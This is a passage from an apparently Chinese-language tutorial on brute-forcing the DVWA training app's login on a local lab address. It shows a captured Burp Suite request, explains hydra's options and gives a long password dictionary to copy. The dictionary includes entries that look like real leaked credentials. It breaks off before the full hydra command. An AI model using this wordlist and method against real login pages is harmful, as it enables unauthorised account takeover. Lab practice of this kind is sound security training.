</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">46</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.0.4/dvwa/login.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛…这么一大堆看着都头晕</p>
<p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
<p>现在网页看起来像时间停止了一样一动不动的对不对？</p>
<p>那么我来解释一下burp这里三个按钮的意思</p>
<ul>
<li>Forward:放行，让网页继续执行抓到的数据包</li>
<li>Drop:丢弃，将这个数据包扔了，网页就执行不了了</li>
</ul>
<p>现在，我们点击<code>Forward</code>，放行这个数据包</p>
<p>这时，网页下面弹出了一段字符串</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-26-23.png" alt=""></p>
<p>码下来，一会儿要用到的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
<p>嗯…整个抓包的过程就完成了。然后就是进行<strong>爆破</strong>了</p>
<h4 id="爆破">爆破</h4>
<p>嘛…最精彩的部分来了</p>
<p>你知道<strong>hydra</strong>吗？如果不知道那么请出门左转用搜索引擎查一下。</p>
<p>我们要给hydra设置这么几个参数</p>
<ul>
<li>-l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin</li>
<li>-P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码</li>
<li>-V : 显示详细过程</li>
<li>-n es : 尝试空口令登录</li>
<li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
<li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">12345
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">Password
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">princess
</span></span><span class="line"><span class="cl">rockyou
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">admin888
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">test
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">5201314
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">woaini1314
</span></span><span class="line"><span class="cl">qq123456
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">7758521
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">a123123
</span></span><span class="line"><span class="cl">123456aa
</span></span><span class="line"><span class="cl">woaini520        
</span></span><span class="line"><span class="cl">woaini
</span></span><span class="line"><span class="cl">100200
</span></span><span class="line"><span class="cl">1314520
</span></span><span class="line"><span class="cl">woaini123
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">q123456
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456789a
</span></span><span class="line"><span class="cl">5211314
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">a123456789
</span></span><span class="line"><span class="cl">z123456
</span></span><span class="line"><span class="cl">asd123456
</span></span><span class="line"><span class="cl">a5201314
</span></span><span class="line"><span class="cl">aa123456
</span></span><span class="line"><span class="cl">zhang123
</span></span><span class="line"><span class="cl">aptx4869
</span></span><span class="line"><span class="cl">123123a
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">5201314a
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">aini1314
</span></span><span class="line"><span class="cl">31415926
</span></span><span class="line"><span class="cl">q1w2e3r4
</span></span><span class="line"><span class="cl">123456qq
</span></span><span class="line"><span class="cl">woaini521
</span></span><span class="line"><span class="cl">1234qwer
</span></span><span class="line"><span class="cl">a111111
</span></span><span class="line"><span class="cl">520520
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">abc123 
</span></span><span class="line"><span class="cl">110110
</span></span><span class="line"><span class="cl">111111a          
</span></span><span class="line"><span class="cl">123456abc        
</span></span><span class="line"><span class="cl">w123456
</span></span><span class="line"><span class="cl">7758258
</span></span><span class="line"><span class="cl">123qweasd
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">a000000
</span></span><span class="line"><span class="cl">qq123123
</span></span><span class="line"><span class="cl">zxc123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">abc123456
</span></span><span class="line"><span class="cl">123456q
</span></span><span class="line"><span class="cl">qq5201314
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">000000a          
</span></span><span class="line"><span class="cl">456852
</span></span><span class="line"><span class="cl">as123456
</span></span><span class="line"><span class="cl">1314521          
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">521521
</span></span><span class="line"><span class="cl">qazwsx123
</span></span><span class="line"><span class="cl">zxc123456
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">666666
</span></span><span class="line"><span class="cl">love1314
</span></span><span class="line"><span class="cl">QAZ123
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">aaaaaa
</span></span><span class="line"><span class="cl">a123321
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">11111111
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">5845201314
</span></span><span class="line"><span class="cl">s123456
</span></span><span class="line"><span class="cl">nihao123
</span></span><span class="line"><span class="cl">caonima123
</span></span><span class="line"><span class="cl">zxcvbnm123
</span></span><span class="line"><span class="cl">wang123
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">1A2B3C4D
</span></span><span class="line"><span class="cl">asdasd123
</span></span><span class="line"><span class="cl">584520
</span></span><span class="line"><span class="cl">753951
</span></span><span class="line"><span class="cl">147258
</span></span><span class="line"><span class="cl">1123581321
</span></span><span class="line"><span class="cl">110120
</span></span><span class="line"><span class="cl">qq1314520        
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">idc123!@#
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">aaa123!@#
</span></span><span class="line"><span class="cl">qq123.com
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">wantian##*(
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">qwe1234
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">123qwer
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1qaz
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">!Q@W#E
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">147369
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">aistar123&lt;&gt;!N
</span></span><span class="line"><span class="cl">321
</span></span><span class="line"><span class="cl">idcji2010
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">336699
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">111
</span></span><span class="line"><span class="cl">111qqq...
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">953139.
</span></span><span class="line"><span class="cl">0258
</span></span><span class="line"><span class="cl">111qqq!!!
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">qqii
</span></span><span class="line"><span class="cl">tyinfo
</span></span><span class="line"><span class="cl">abcd36888
</span></span><span class="line"><span class="cl">rst_login
</span></span><span class="line"><span class="cl">OAOidc
</span></span><span class="line"><span class="cl">OAOidc123!@#
</span></span><span class="line"><span class="cl">OAOidc123
</span></span><span class="line"><span class="cl">esin888
</span></span><span class="line"><span class="cl">qwer
</span></span><span class="line"><span class="cl">power123
</span></span><span class="line"><span class="cl">power.liu
</span></span><span class="line"><span class="cl">power.yu
</span></span><span class="line"><span class="cl">dns99+588
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">7715123
</span></span><span class="line"><span class="cl">sdwer
</span></span><span class="line"><span class="cl">power.zhao
</span></span><span class="line"><span class="cl">sdwer123
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">esincs
</span></span><span class="line"><span class="cl">jspower123.0
</span></span><span class="line"><span class="cl">5656789
</span></span><span class="line"><span class="cl">2323456
</span></span><span class="line"><span class="cl">power.com
</span></span><span class="line"><span class="cl">power123.0
</span></span><span class="line"><span class="cl">power0.123
</span></span><span class="line"><span class="cl">jspower.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">hlwj0519-1205.jf
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">zaxscdvf
</span></span><span class="line"><span class="cl">..0
</span></span><span class="line"><span class="cl">!@#$QWER
</span></span><span class="line"><span class="cl">95313
</span></span><span class="line"><span class="cl">1231321
</span></span><span class="line"><span class="cl">321123
</span></span><span class="line"><span class="cl">vipnew
</span></span><span class="line"><span class="cl">idc0514
</span></span><span class="line"><span class="cl">1235698
</span></span><span class="line"><span class="cl">235689
</span></span><span class="line"><span class="cl">326598
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">idc11
</span></span><span class="line"><span class="cl">21vianet
</span></span><span class="line"><span class="cl">#@!ewq
</span></span><span class="line"><span class="cl">1010
</span></span><span class="line"><span class="cl">111qqq
</span></span><span class="line"><span class="cl">1234%^&amp;*
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">4867086
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">123456!@#
</span></span><span class="line"><span class="cl">10000
</span></span><span class="line"><span class="cl">794613
</span></span><span class="line"><span class="cl">784512
</span></span><span class="line"><span class="cl">895623
</span></span><span class="line"><span class="cl">789456
</span></span><span class="line"><span class="cl">456123
</span></span><span class="line"><span class="cl">654321
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">1234!@#$
</span></span><span class="line"><span class="cl">11185
</span></span><span class="line"><span class="cl">12345!@#$%
</span></span><span class="line"><span class="cl">qwe123!@#
</span></span><span class="line"><span class="cl">!@#123
</span></span><span class="line"><span class="cl">!@#321
</span></span><span class="line"><span class="cl">123#@!
</span></span><span class="line"><span class="cl">19861212
</span></span><span class="line"><span class="cl">19831212
</span></span><span class="line"><span class="cl">19841020
</span></span><span class="line"><span class="cl">#@!123
</span></span><span class="line"><span class="cl">#@!321
</span></span><span class="line"><span class="cl">idcidc
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">!@#$%^&amp;*()
</span></span><span class="line"><span class="cl">)(*&amp;^%$#@!
</span></span><span class="line"><span class="cl">0987654321
</span></span><span class="line"><span class="cl">tyidc
</span></span><span class="line"><span class="cl">1122
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">idcidcok
</span></span><span class="line"><span class="cl">idcuser
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">1234abcd
</span></span><span class="line"><span class="cl">caonima
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">888888
</span></span><span class="line"><span class="cl">admin!@#
</span></span><span class="line"><span class="cl">abc!@#
</span></span><span class="line"><span class="cl">!Q@W#E$R%T
</span></span><span class="line"><span class="cl">idc2010
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">qqaazz
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">admin
</span></span><span class="line"><span class="cl">admin1
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">aaa111
</span></span><span class="line"><span class="cl">111aaa
</span></span><span class="line"><span class="cl">123aaa
</span></span><span class="line"><span class="cl">lh222
</span></span><span class="line"><span class="cl">lhidc
</span></span><span class="line"><span class="cl">123a
</span></span><span class="line"><span class="cl">a123
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">qazwsx
</span></span><span class="line"><span class="cl">qazxsw
</span></span><span class="line"><span class="cl">0123
</span></span><span class="line"><span class="cl">123112233
</span></span><span class="line"><span class="cl">123111
</span></span><span class="line"><span class="cl">www.7x24.cn
</span></span><span class="line"><span class="cl">shisp.net
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">1230..
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456qwe
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">12345qwert
</span></span><span class="line"><span class="cl">zxcvbnm
</span></span><span class="line"><span class="cl">qwerty
</span></span><span class="line"><span class="cl">qweqwe
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">123ewq
</span></span><span class="line"><span class="cl">qwe321
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">1234rewq
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">lituobestsanmao
</span></span><span class="line"><span class="cl">!@#19841010
</span></span><span class="line"><span class="cl">msfadmin
</span></span><span class="line"><span class="cl">19885510
</span></span><span class="line"><span class="cl">xyidc_2006
</span></span><span class="line"><span class="cl">95217189
</span></span><span class="line"><span class="cl">95217
</span></span><span class="line"><span class="cl">chinayixun
</span></span><span class="line"><span class="cl">huachen1258zz
</span></span><span class="line"><span class="cl">sanhe123
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">3H8IDC72sanhe000
</span></span><span class="line"><span class="cl">xiaoyili
</span></span><span class="line"><span class="cl">sanhe000~!@#  
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">ccfeng66131421  
</span></span><span class="line"><span class="cl">!@#59560955
</span></span><span class="line"><span class="cl">tkggja850518`1
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">anada325!@#
</span></span><span class="line"><span class="cl">www.txwscx.comsritgyxf2sxy19831122zx
</span></span><span class="line"><span class="cl">ZHONGGUO$#@!999@
</span></span><span class="line"><span class="cl">admin13906271234
</span></span><span class="line"><span class="cl">395835961
</span></span><span class="line"><span class="cl">senlinyan
</span></span><span class="line"><span class="cl">3203672
</span></span><span class="line"><span class="cl">9527999!!!
</span></span><span class="line"><span class="cl">P@ssw0rd
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">idc9aewr42
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">qsx6059410172.
</span></span><span class="line"><span class="cl">idc0001
</span></span><span class="line"><span class="cl">idc800888
</span></span><span class="line"><span class="cl">idc46121
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">882627.8
</span></span><span class="line"><span class="cl">luofei520!@#123
</span></span><span class="line"><span class="cl">852799!!!
</span></span><span class="line"><span class="cl">idc0123.0
</span></span><span class="line"><span class="cl">513tyml.com
</span></span><span class="line"><span class="cl">abc123!@#
</span></span><span class="line"><span class="cl">1q2w3e,./? &gt;&lt;
</span></span><span class="line"><span class="cl">6504710shuazuan
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">752883855.
</span></span><span class="line"><span class="cl">senlinyan$
</span></span><span class="line"><span class="cl">admin001
</span></span><span class="line"><span class="cl">6695zx
</span></span><span class="line"><span class="cl">scictd9821622
</span></span><span class="line"><span class="cl">365obsserver!
</span></span><span class="line"><span class="cl">ranglm123456
</span></span><span class="line"><span class="cl">13920225257
</span></span><span class="line"><span class="cl">idc925111
</span></span><span class="line"><span class="cl">1qaz@wsx#edc
</span></span><span class="line"><span class="cl">.......199
</span></span><span class="line"><span class="cl">xu15817079919
</span></span><span class="line"><span class="cl">yanjin0429
</span></span><span class="line"><span class="cl">zhangznw
</span></span><span class="line"><span class="cl">13527380230
</span></span><span class="line"><span class="cl">idc0.01
</span></span><span class="line"><span class="cl">idc123&amp;123
</span></span><span class="line"><span class="cl">662766
</span></span><span class="line"><span class="cl">122.224
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">.......199@
</span></span><span class="line"><span class="cl">liuzhangzi1988
</span></span><span class="line"><span class="cl">123456!@#$%^
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">dahouzi110
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">trista188#**
</span></span><span class="line"><span class="cl">mm1237
</span></span><span class="line"><span class="cl">07736056123
</span></span><span class="line"><span class="cl">TnHoo15862380404
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">189532210113
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">gedingfeng1102888
</span></span></code></pre></td></tr></table>
</div>
</div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
